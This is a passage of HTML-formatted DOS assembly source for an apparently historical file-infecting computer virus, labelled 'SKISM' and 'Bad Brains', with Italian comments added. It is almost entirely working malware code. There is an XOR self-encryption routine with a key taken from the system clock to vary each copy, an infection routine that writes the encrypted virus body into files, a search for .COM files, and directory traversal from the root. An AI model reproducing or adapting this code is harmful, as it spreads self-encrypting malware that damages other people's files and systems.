color:#B32D9D'>encrypt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>push<span
style="mso-spacerun: yes">     </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">      </span>cx,offset virus_code+virus_size<span
style="mso-spacerun: yes">   </span>; CX = virus_code * 554<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">    </span>mov<span style="mso-spacerun: yes">     
</span>si,offset virus_code<span style="mso-spacerun: yes">             
</span>; inizio parte da crittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">      </span>di,si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>cld<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; ciclo di crittazione, effettuata 2 bytes alla volta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>xor_loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>lodsw<span style="mso-spacerun: yes">                            
</span>; carica una word<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>xor<span style="mso-spacerun: yes">      </span>ax,encrypt_val <span
style="mso-spacerun: yes">          </span>; critta con chiave precedentemente
salvata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>stosw<span
style="mso-spacerun: yes">                             </span>; salva la word
eaggiorna puntatore a DI<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>dec<span
style="mso-spacerun: yes">      </span>cx<span style="mso-spacerun:
yes">                       </span>; decremente contatore<span
style="mso-spacerun: yes">           </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>jcxz<span
style="mso-spacerun: yes">     </span>stoppa<span style="mso-spacerun:
yes">                   </span>; finito ? <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>jmp<span style="mso-spacerun: yes">      </span>xor_loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>stoppa:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>pop<span style="mso-spacerun: yes">      </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>infectfile:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,code_start<span style="mso-spacerun:
yes">             </span>;where virus starts in memory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>bx,handle<span style="mso-spacerun:
yes">                 </span>;load bx with handle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>cx,virus_size<span style="mso-spacerun:
yes">             </span>;number of bytes to write<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>call<span style="mso-spacerun: yes">    </span>encrypt<span
style="mso-spacerun: yes">                   </span>;cripta il codice<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,4000h<span style="mso-spacerun:
yes">                  </span>;write to file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>int<span style="mso-spacerun:
yes">     </span>21h<span style="mso-spacerun: yes">                      
</span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>call<span
style="mso-spacerun: yes">    </span>encrypt<span style="mso-spacerun:
yes">                   </span>;dercitta per terminare esecuzione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes"> </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; parte da crittografare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>virus_code:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>vname<span style="mso-spacerun: yes">       
</span>db<span style="mso-spacerun: yes">     </span>'SKISM',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>wildcards<span style="mso-spacerun: yes">   
</span>db<span style="mso-spacerun: yes">     </span>&quot;*&quot;,0<span
style="mso-spacerun: yes">              </span>;search for directory argument<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>filespec<span style="mso-spacerun: yes">    
</span>db<span style="mso-spacerun: yes">     </span>&quot;*.COM&quot;,0<span
style="mso-spacerun: yes">          </span>;search for EXE file argument<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>rootdir<span style="mso-spacerun: yes">     
</span>db<span style="mso-spacerun: yes">     </span>&quot;\&quot;,0<span
style="mso-spacerun: yes">              </span>;argument for root directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>dirdata<span style="mso-spacerun: yes">     
</span>db<span style="mso-spacerun: yes">     </span>43 dup (?)<span
style="mso-spacerun: yes">         </span>;holds directory DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>filedata<span style="mso-spacerun: yes">    
</span>db<span style="mso-spacerun: yes">     </span>43 dup (?)<span
style="mso-spacerun: yes">         </span>;holds files DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>diskdtaseg<span style="mso-spacerun: yes">  
</span>dw<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;holds disk dta segment<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>diskdtaofs<span style="mso-spacerun: yes">  
</span>dw<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;holds disk dta offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>tempofs<span style="mso-spacerun: yes">     
</span>dw<span style="mso-spacerun: yes">     </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>tempseg<span style="mso-spacerun: yes">     
</span>dw<span style="mso-spacerun: yes">     </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>drivecode<span style="mso-spacerun: yes">   
</span>db<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;holds drive code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>currentdir<span style="mso-spacerun: yes">  
</span>db<span style="mso-spacerun: yes">     </span>64 dup (?)<span
style="mso-spacerun: yes">         </span>;save current directory into this<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>handle<span style="mso-spacerun: yes">      
</span>dw<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;holds file handle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>orig_time<span style="mso-spacerun: yes">    </span>dw<span
style="mso-spacerun: yes">     </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>orig_date<span style="mso-spacerun: yes">   
</span>dw<span style="mso-spacerun: yes">     </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>orig_attr<span style="mso-spacerun: yes">   
</span>dw<span style="mso-spacerun: yes">     </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>idbuffer<span style="mso-spacerun: yes">    
</span>dw<span style="mso-spacerun: yes">     </span>2 dup<span
style="mso-spacerun: yes">  </span>(?)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>virus:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>mov<span
style="mso-spacerun: yes">    </span>ax,3000h<span style="mso-spacerun:
yes">                  </span>;get dos version<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>int<span
style="mso-spacerun: yes">    </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>cmp<span
style="mso-spacerun: yes">    </span>al,02h<span style="mso-spacerun:
yes">                    </span>;is it at least 2.00?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes"> </span>jb<span style="mso-spacerun: yes">    
</span>bus<span style="mso-spacerun: yes">                       </span>;won't
infect less than 3.00<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; ricava la chiave a la salva in un’opportuna variabile<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">      </span>mov<span
style="mso-spacerun: yes">    </span>ah,2ch<span style="mso-spacerun:
yes">                    </span>; legge l’ora<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">      </span>int<span
style="mso-spacerun: yes">    </span>21h<span style="mso-spacerun:
yes">                       </span>; in DL = centesimi; DH = secondi, CL = minuti<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">      </span>add<span
style="mso-spacerun: yes">    </span>dh,cl<span style="mso-spacerun:
yes">                     </span>; secondi = secondi + minuti<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">      </span>mov<span
style="mso-spacerun: yes">    </span>encrypt_val,dx<span style="mso-spacerun:
yes">            </span>; con questa chiave sono possibili 65535 mutazioni<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>setdta:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset dirdata<span
style="mso-spacerun: yes">         </span>;offset of where to hold new dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes"> </span>ah,1ah<span style="mso-spacerun: yes">                   
</span>;set dta address<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>newdir:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,19h<span style="mso-spacerun:
yes">                    </span>;get drive code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dl,al<span style="mso-spacerun:
yes">                     </span>;save drivecode<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>inc<span
style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">   </span>dl<span style="mso-spacerun: yes">                       
</span>;add one to dl, because functions differ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,47h<span style="mso-spacerun:
yes">                    </span>;get current directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>si, offset currentdir<span
style="mso-spacerun: yes">     </span>;buffer to save directory in<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset rootdir<span
style="mso-spacerun: yes">         </span>;move dx to change to root directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3bh<span style="mso-spacerun:
yes">                    </span>;change directory to root<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>scandirs:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>mov<span
style="mso-spacerun: yes">     </span>cx,13h<span style="mso-spacerun:
yes">                    </span>;look for directorys<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx, offset wildcards<span
style="mso-spacerun: yes">      </span>;look for '*'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,4eh<span style="mso-spacerun:
yes">                    </span>;find first file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>cmp<span
style="mso-spacerun: yes">     </span>ax,12h<span style="mso-spacerun:
yes">                    </span>;no first file?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jne<span
style="mso-spacerun: yes">     </span>dirloop<span style="mso-spacerun:
yes">                   </span>;no dirs found? bail out<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>bus:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jmp<span
style="mso-spacerun: yes">     </span>abort<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>copyright<span style="mso-spacerun: yes"> 
</span>db<span style="mso-spacerun: yes">  </span>'Bad Brains'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>dirloop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,4fh<span style="mso-spacerun:
yes">                    </span>;find next file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>cmp<span
style="mso-spacerun: yes">     </span>ax,12h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>je<span
style="mso-spacerun: yes">      </span>quit<span style="mso-spacerun:
yes">                      </span>;no more dirs found, roll out<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>chdir:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset dirdata+filename;point dx to
fcb - filename<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3bh<span style="mso-spacerun:
yes">                    </span>;change directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,2fh<span style="mso-spacerun:
yes">                    </span>;get current dta address<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">          </span><span style="mso-spacerun: yes">             </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
